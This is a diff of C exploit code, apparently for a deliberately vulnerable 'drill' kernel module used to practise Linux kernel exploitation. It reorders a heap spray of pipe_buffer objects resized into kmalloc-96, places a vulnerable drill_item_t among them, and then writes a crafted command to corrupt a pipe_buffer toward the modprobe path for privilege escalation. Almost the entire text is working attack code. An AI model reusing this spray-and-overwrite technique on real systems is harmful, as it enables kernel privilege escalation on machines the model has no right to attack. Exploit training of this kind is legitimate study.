@@ -276,8 +276,8 @@ int main(void)
 	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
 	int act_fd = -1;
 	long i = 0;
-	char pipe_data[PIPE_CAPACITY];
 	int pipe_fds[PIPES_N][2];
+	char pipe_data[PIPE_CAPACITY];
 	char err_act[64];
 	int success = 0;
 
@@ -310,56 +310,44 @@ int main(void)
 		pipe_fds[i][1] = -1;
 	}
 
+	memset(pipe_data, 0, sizeof(pipe_data));
+
 	for (i = 0; i < PIPES_N; i++) {
 		ret = pipe(pipe_fds[i]);
 		if (ret < 0) {
 			perror("[-] pipe");
 			goto end;
 		}
-	}
-	printf("[+] opened pipes\n");
 
-	memset(pipe_data, 0, sizeof(pipe_data));
-
-	for (i = 0; i < SPRAY_PARTIAL; i++) {
-		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PIPE_CAPACITY);
-		if (ret != PIPE_CAPACITY) {
-			perror("[-] fcntl");
-			goto end;
-		}
-		if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
-			perror("[-] write");
-			goto end;
-		}
-	}
-	printf("[+] sprayed pipe_buffers in partial lists\n");
-
-	/* place vulnerable drill_item between pipe_buffers */
-	ret = act(act_fd, DRILL_ACT_ALLOC, 0, NULL);
-	if (ret == EXIT_FAILURE) {
-		perror("[-] drill alloc");
-		goto end;
-	}
-	printf("[+] allocated evil drill_item\n");
-
-	for (i = SPRAY_PARTIAL; i < PIPES_N; i++) {
 		/*
-		 * A `drill_item` object allocated in kmalloc-96 cache. It is known that the size of the
-		 * `pipe_buffer' is 40 bytes, which means that we need two of them to reach kmalloc-96.
+		 * Change the pipe_buffer array size to 2 * sizeof(struct pipe_buffer),
+		 * which is 80 bytes. It should live in kmalloc-96 together with
+		 * the drill_item_t object.
+		 *
+		 * We should resize the pipe capacity right now to avoid hitting
+		 * the limit in /proc/sys/fs/pipe-user-pages-soft.
 		 */
 		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PIPE_CAPACITY);
 		if (ret != PIPE_CAPACITY) {
 			perror("[-] fcntl");
 			goto end;
 		}
+
 		if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
 			perror("[-] write");
 			goto end;
 		}
-	}
-	printf("[+] sprayed pipe_buffers in kmalloc-96\n");
 
-	printf("[*] trying to corrupt `pipe_buffer`...\n");
+		if (i == SPRAY_PARTIAL) {
+			ret = act(act_fd, DRILL_ACT_ALLOC, 0, NULL);
+			if (ret == EXIT_FAILURE)
+				goto end;
+			printf("[+] allocated a vulnerable drill_item_t object\n");
+		}
+	}
+	printf("[+] allocated pipe_buffer objects and a drill_item_t object among them\n");
+
+	printf("[*] trying to corrupt a pipe_buffer near the drill_item_t object...\n");
 	snprintf(err_act, sizeof(err_act), "3 %d 0x%lx 0x50", 0, VIRTUAL_TO_PAGE(MODPROBE_PTR));
 	ret = write(act_fd, err_act, strlen(err_act) + 1);
 	if (ret <= 0) {
